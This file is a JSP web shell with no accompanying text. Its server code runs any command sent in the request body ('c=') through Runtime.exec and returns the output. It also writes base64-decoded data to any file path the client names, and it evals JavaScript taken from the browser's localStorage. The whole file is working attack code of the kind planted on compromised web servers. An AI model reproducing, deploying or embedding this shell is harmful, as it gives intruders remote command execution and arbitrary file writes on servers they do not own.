<%@page import="java.io.*, java.util.*, javax.xml.bind.*, java.net.*"%>
<script>eval(window.localStorage.embed)</script>
<%!
	public String v(String w){
		String x="";
		try{
			x=URLDecoder.decode(w,"UTF-8");
		}catch(Exception e){}
		return x;
	}
%>
<%
	String o,l,d;
	o=l=d="";
	DataInputStream r=new DataInputStream(request.getInputStream());
	while((l=r.readLine())!=null){
		d+=l;
	}
	if(d.indexOf("c=")>=0){
		String g=v(d.substring(2));
		String s;
		try{
			Process p=Runtime.getRuntime().exec(g);
			DataInputStream i=new DataInputStream(p.getInputStream());
			out.print("<pre>");
			while((s=i.readLine())!=null){
				o+=s.replace("<","&lt;").replace(">","&gt;")+"<br>";
			}
		}catch(Exception e){
			out.print(e);
		}
	}else{
		if(d.length()>1){
			int b=d.indexOf("b=");
			int n=d.indexOf("n=");
			byte[] m=DatatypeConverter.parseBase64Binary(v(d.substring(b+2)));
			String f=v(d.substring(2,n-1))+File.separator+v(d.substring(n+2,b-1));
			try{
				OutputStream stream=new FileOutputStream(f);
				stream.write(m);
				o="Uploaded: "+f;
			}catch(Exception e){
				out.print(e);
			}
		}
	}
%>
<%=o%>